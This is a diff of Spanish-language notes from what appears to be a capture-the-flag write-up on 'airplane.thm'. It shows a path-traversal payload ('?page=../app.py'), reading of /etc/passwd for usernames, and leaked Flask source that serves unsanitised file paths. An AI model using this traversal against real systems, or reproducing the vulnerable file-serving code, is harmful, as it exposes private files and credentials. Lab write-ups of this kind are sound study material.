@@ -184,3 +184,47 @@ sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
 Confirmo la vulnerabilidad.
 
 De passwd puedo sacar un par de usuarios. carlos y hudson.
+
+Probando diversas payloads para ver la app, suponiendo que es flask, la siguiente me saca el código de app.py.
+
+http://airplane.thm:8000/?page=../app.py
+
+from flask import Flask, send_file, redirect, render_template, request
+import os.path
+
+app = Flask(__name__)
+
+
+@app.route('/')
+def index():
+    if 'page' in request.args:
+        page = 'static/' + request.args.get('page')
+
+        if os.path.isfile(page):
+            resp = send_file(page)
+            resp.direct_passthrough = False
+
+            if os.path.getsize(page) == 0:
+                resp.headers["Content-Length"]=str(len(resp.get_data()))
+
+            return resp
+        
+        else:
+            return "Page not found"
+
+    else:
+        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    
+
+
+@app.route('/airplane')
+def airplane():
+    return render_template('airplane.html')
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8000)
+
+Bueno, confirmo que no sanitiza nada, puedo acceder a cualquier archivo.
+
+Voy a ver airplane.html, que esta en el código.
+Es una página con el texto 'Let's Fly' girando.
